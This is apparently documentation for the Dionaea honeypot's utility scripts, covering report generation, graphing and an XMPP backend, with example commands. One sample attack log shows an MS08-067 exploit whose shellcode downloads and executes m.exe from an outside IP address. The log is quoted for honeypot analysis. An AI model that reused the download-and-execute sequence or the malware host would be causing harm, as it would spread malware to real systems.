Utils
=====

Dionaea ships with some utils, as these utils are written in python and
rely on the python3 interpreter dionaea requires to operate, this
software can be found in modules/python/utils.


          readlogsqltree <#readlogsqltree> -
          modules/python/readlogsqltree.py

readlogsqltree is a python3 script which queries the logsql sqlite
database for attacks, and prints out all related information for every
attack.
This is an example for an attack, you get the vulnerability exploited,
the time, the attacker, information about the shellcode, the file
offered for download, and even the virustotal report for the file.

2010-10-07 20:37:27
  connection 483256 smbd tcp accept 10.0.1.11:445 <- 93.177.176.190:47650 (483256 None)
   dcerpc bind: uuid '4b324fc8-1670-01d3-1278-5a47bf6ee188' (SRVSVC) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid '7d705026-884d-af82-7b3d-961deaeb179a' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid '7f4fdfe9-2be7-4d6b-a5d4-aa3c831503a1' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid '8b52c8fd-cc85-3a74-8b15-29e030cdac16' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid '9acbde5b-25e1-7283-1f10-a3a292e73676' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid '9f7e2197-9e40-bec9-d7eb-a4b0f137fe95' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid 'a71e0ebe-6154-e021-9104-5ae423e682d0' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid 'b3332384-081f-0e95-2c4a-302cc3080783' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid 'c0cdf474-2d09-f37f-beb8-73350c065268' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid 'd89a50ad-b919-f35c-1c99-4153ad1e6075' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc bind: uuid 'ea256ce5-8ae1-c21b-4a17-568829eec306' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
   dcerpc request: uuid '4b324fc8-1670-01d3-1278-5a47bf6ee188' (SRVSVC) opnum 31 (NetPathCanonicalize (MS08-67))
   profile: [{'return': '0x7df20000', 'args': ['urlmon'], 'call': 'LoadLibraryA'}, {'return': '0', 'args': ['', 'http://208.53.183.158/m.exe', '60.exe', '0', '0'], 'call': 'URLDownloadToFile'}, {'return': '32', 'args': ['60.exe', '895'], 'call': 'WinExec'}, {'return': '0', 'args': ['-1'], 'call': 'Sleep'}]
   offer: http://208.53.183.158/m.exe
   download: 3eab379ddac7d80d3e38399fd273ddd4 http://208.53.183.158/m.exe
     virustotal 2010-10-07 04:59:07 5/38 (13%) http://www.virustotal.com/file-scan/report.html?id=265e39edcba9d9004451601544e625f2d3d04f837d0aaf1f8464cb2c819c1939-1286420347
       names 'High Risk Fraudulent Security Program' 'Suspicious file' 'Trojan.DownLoader1.27100' 'Worm.Win32.Rimecud' 'Worm:Win32/Rimecud.B'


To create such report for your own honeypots activities for the last 24
hours run:


./readlogsqltree.py  -t $(date '+%s')-24*3600 /opt/dionaea/var/dionaea/logsql.sqlite


          gnuplotsql <#gnuplotsql> - modules/python/gnuplotsql.py

gnuplotsql is a very slow python3 script which runs some queries on the
logsql <#logsql> sqlite database and creates graphs with gnuplot of the
data, stores them on disk and creates an index of the data. The images
are per protocol and look like this: Overview for dionaea smbd.
Here <gnuplotsql> is how the whole thing looks like.
To create such images of your own data, run:


./gnuplotsql.py -d /opt/dionaea/var/dionaea/logsql.sqlite -p smbd -p epmapper -p mssqld -p httpd -p ftpd

The blog got something on gnuplotsql as well:

  * 2010-12-05 sudden death <http://carnivore.it/2010/12/05/sudden_death>
  * 2010-10-01 Infosanity's Blog: gnuplotsql.py
    <http://blog.infosanity.co.uk/2010/10/01/gnuplotsql-py/>
  * 2010-09-19 gnuplotsql <http://carnivore.it/2010/09/19/gnuplotsql>


          pg_backend <#pg_backend> - modules/python/xmpp/pg_backend.py

pg_backend is the backend for logxmpp <#logxmpp>, currently it is a
python2.x script which uses pyxmpp to access the xmpp service. It parses
the messages received and can store the events in a postgres database
and the received files on disk. pg_backend requires an xmpp account.
/without db/


./pg_backend.py -U USER@sensors.carnivore.it -P XMPPPASS -M dionaea.sensors.carnivore.it -C anon-files -C anon-events -f /tmp/


/with db/ create database

psql ...

start backend


./pg_backend.py -U USER@sensors.carnivore.it -P XMPPPASS -M dionaea.sensors.carnivore.it -C anon-files -C anon-events -s DBHOST -u DBUSER -d xmpp -p DBPASS -f /tmp/
